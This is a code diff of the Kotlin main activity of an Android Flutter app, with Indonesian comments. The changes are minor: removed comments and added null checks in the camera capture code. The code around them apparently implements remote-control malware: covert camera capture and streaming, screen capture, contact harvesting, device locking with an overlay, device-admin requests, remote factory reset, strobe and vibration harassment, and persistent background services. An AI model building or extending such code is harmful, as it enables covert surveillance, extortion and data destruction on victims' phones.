@@ -12,7 +12,6 @@ import android.graphics.BitmapFactory
 import android.graphics.Canvas
 import android.graphics.ImageFormat
 import android.graphics.PixelFormat
-import android.graphics.SurfaceTexture
 import android.hardware.camera2.*
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.display.DisplayManager
@@ -34,7 +33,6 @@ import android.provider.Settings
 import android.util.Base64
 import android.util.DisplayMetrics
 import android.util.Log
-import android.view.Surface
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import io.flutter.embedding.android.FlutterActivity
@@ -49,10 +47,13 @@ class MainActivity : FlutterActivity() {
     private val CHANNEL = "orgsapp/device_info"
     private val FRAME_CHANNEL = "orgsapp/camera_frames"
 
-    // MediaPlayer untuk audio
+    // ⬇️ MAIN HANDLER (FIX: dideklarasi di sini)
+    private val mainHandler = Handler(Looper.getMainLooper())
+
+    // MediaPlayer
     private var mediaPlayer: MediaPlayer? = null
 
-    // MediaProjection untuk screen capture
+    // MediaProjection
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
@@ -78,11 +79,9 @@ class MainActivity : FlutterActivity() {
 
         Log.d("MainActivity", "🚀 onCreate")
 
-        // Start native services
         KeepAliveService.start(this)
         ConnectionService.start(this)
 
-        // Screen metrics
         val metrics = DisplayMetrics()
         @Suppress("DEPRECATION")
         windowManager.defaultDisplay.getMetrics(metrics)
@@ -90,14 +89,10 @@ class MainActivity : FlutterActivity() {
         screenHeight = metrics.heightPixels
         screenDensity = metrics.densityDpi
 
-        // Init camera thread
         cameraThread = HandlerThread("CameraThread").apply { start() }
         cameraHandler = Handler(cameraThread!!.looper)
 
-        // Request battery optimization exemption
         requestBatteryOptimizationExemption()
-
-        // Request camera permission
         requestCameraPermissionIfNeeded()
     }
 
@@ -136,7 +131,6 @@ class MainActivity : FlutterActivity() {
 
         Log.d("MainActivity", "🔧 configureFlutterEngine")
 
-        // Method Channel
         MethodChannel(
             flutterEngine.dartExecutor.binaryMessenger,
             CHANNEL,
@@ -144,67 +138,53 @@ class MainActivity : FlutterActivity() {
             try {
                 Log.d("MainActivity", "Method: ${call.method}")
                 when (call.method) {
-                    // DEVICE INFO
                     "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
                     "getModel" -> result.success(Build.MODEL)
                     "getBrand" -> result.success(Build.BRAND)
                     "getAndroidVersion" -> result.success(Build.VERSION.RELEASE)
 
-                    // SETTINGS
                     "openAccessibilitySettings" -> openAccessibilitySettings(result)
 
-                    // FLASHLIGHT
                     "flashStrobe" -> toggleFlash(true, result)
                     "stopStrobe" -> toggleFlash(false, result)
 
-                    // VIBRATE
                     "vibrateLoop" -> vibrateLoop(result)
                     "stopVibrate" -> stopVibrate(result)
 
-                    // URL
                     "openUrl" -> openUrl(call.argument<String>("url"), result)
-
-                    // FORCE OPEN
                     "forceOpen" -> forceOpen(result)
 
-                    // SCREEN CAPTURE
                     "captureScreen" -> captureScreenWithProjection(result)
                     "requestScreenCapture" -> requestScreenCapture(result)
                     "stopScreenCapture" -> stopScreenCapture(result)
 
-                    // CAMERA - REAL
-                    "takePhoto" -> takePhoto(call.argument<String>("camera") ?: "back", result)
+                    "takePhoto" -> takePhoto(
+                        call.argument<String>("camera") ?: "back", result
+                    )
                     "startCameraStream" -> startCameraStream(
-                        call.argument<String>("camera") ?: "back",
-                        result,
+                        call.argument<String>("camera") ?: "back", result
                     )
                     "stopCameraStream" -> stopCameraStream(result)
 
-                    // AUDIO
                     "playAudio" -> playAudio(call.argument<String>("url"), result)
                     "stopAudio" -> stopAudio(result)
                     "startAudioStream" -> result.success(false)
                     "stopAudioStream" -> result.success(true)
 
-                    // WALLPAPER
                     "setWallpaper" -> setWallpaper(call.argument<String>("url"), result)
 
-                    // LOCK / ADMIN
                     "hardLock" -> hardLock(result)
                     "unlock" -> unlock(result)
                     "isDeviceAdmin" -> isDeviceAdmin(result)
                     "requestDeviceAdmin" -> requestDeviceAdmin(result)
 
-                    // PROTECTION
                     "enableProtection" -> enableProtection(
                         call.argument<String>("method") ?: "both", result
                     )
                     "disableProtection" -> disableProtection(result)
 
-                    // FACTORY RESET
                     "factoryReset" -> factoryReset(result)
 
-                    // CONTACTS
                     "getContacts" -> getContacts(result)
 
                     else -> result.notImplemented()
@@ -215,7 +195,6 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // Event Channel (Camera frames)
         EventChannel(
             flutterEngine.dartExecutor.binaryMessenger,
             FRAME_CHANNEL,
@@ -227,7 +206,6 @@ class MainActivity : FlutterActivity() {
 
             override fun onCancel(args: Any?) {
                 frameEventSink = null
-                Log.d("MainActivity", "📷 Camera frame stream cancelled")
             }
         })
     }
@@ -276,7 +254,6 @@ class MainActivity : FlutterActivity() {
                 return
             }
 
-            // Setup ImageReader
             val chars = manager.getCameraCharacteristics(targetCameraId)
             val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
@@ -313,7 +290,6 @@ class MainActivity : FlutterActivity() {
                 }
             }, cameraHandler)
 
-            // Open camera
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                 != PackageManager.PERMISSION_GRANTED) {
                 pendingCameraResult?.error("PERM", "Camera permission denied", null)
@@ -351,10 +327,20 @@ class MainActivity : FlutterActivity() {
     private fun createCaptureSession() {
         try {
             val surface = cameraImageReader?.surface ?: return
-            val captureRequestBuilder = cameraDevice?.createCaptureRequest(
+
+            // ⬇️ FIX: CaptureRequest.Builder? nullable
+            val captureRequestBuilder: CaptureRequest.Builder? = cameraDevice?.createCaptureRequest(
                 CameraDevice.TEMPLATE_STILL_CAPTURE,
             )
-            captureRequestBuilder?.addTarget(surface)
+
+            if (captureRequestBuilder == null) {
+                Log.e("MainActivity", "captureRequestBuilder null")
+                pendingCameraResult?.error("CAM", "Builder null", null)
+                pendingCameraResult = null
+                return
+            }
+
+            captureRequestBuilder.addTarget(surface)
 
             cameraDevice?.createCaptureSession(
                 listOf(surface),
@@ -363,7 +349,7 @@ class MainActivity : FlutterActivity() {
                         captureSession = session
                         try {
                             session.capture(
-                                captureRequestBuilder.build(),
+                                captureRequestBuilder.build(),  // ⬅️ Builder non-null
                                 null,
                                 cameraHandler,
                             )
@@ -374,7 +360,7 @@ class MainActivity : FlutterActivity() {
 
                     override fun onConfigureFailed(session: CameraCaptureSession) {
                         Log.e("MainActivity", "Session configure failed")
-                        pendingCameraResult?.error("CAM", "Session configure failed", null)
+                        pendingCameraResult?.error("CAM", "Session failed", null)
                         pendingCameraResult = null
                     }
                 },
@@ -382,6 +368,8 @@ class MainActivity : FlutterActivity() {
             )
         } catch (e: Exception) {
             Log.e("MainActivity", "createCaptureSession error", e)
+            pendingCameraResult?.error("CAM", e.message, null)
+            pendingCameraResult = null
         }
     }
 
@@ -427,9 +415,7 @@ class MainActivity : FlutterActivity() {
             }
 
             cameraImageReader?.close()
-            cameraImageReader = ImageReader.newInstance(
-                640, 480, ImageFormat.JPEG, 2,
-            )
+            cameraImageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
 
             cameraImageReader?.setOnImageAvailableListener({ reader ->
                 try {
@@ -480,10 +466,18 @@ class MainActivity : FlutterActivity() {
     private fun startRepeatingCapture() {
         try {
             val surface = cameraImageReader?.surface ?: return
-            val builder = cameraDevice?.createCaptureRequest(
+
+            // ⬇️ FIX: CaptureRequest.Builder? nullable
+            val builder: CaptureRequest.Builder? = cameraDevice?.createCaptureRequest(
                 CameraDevice.TEMPLATE_PREVIEW,
             )
-            builder?.addTarget(surface)
+
+            if (builder == null) {
+                Log.e("MainActivity", "builder null")
+                return
+            }
+
+            builder.addTarget(surface)
 
             cameraDevice?.createCaptureSession(
                 listOf(surface),
@@ -492,7 +486,7 @@ class MainActivity : FlutterActivity() {
                         captureSession = session
                         try {
                             session.setRepeatingRequest(
-                                builder.build(),
+                                builder.build(),  // ⬅️ Builder non-null
                                 null,
                                 cameraHandler,
                             )
@@ -719,7 +713,6 @@ class MainActivity : FlutterActivity() {
     }
 
     private fun unlock(result: MethodChannel.Result) {
-        // Unlock lock overlay kalau ada
         LockOverlayManager.unlock()
         result.success(true)
     }
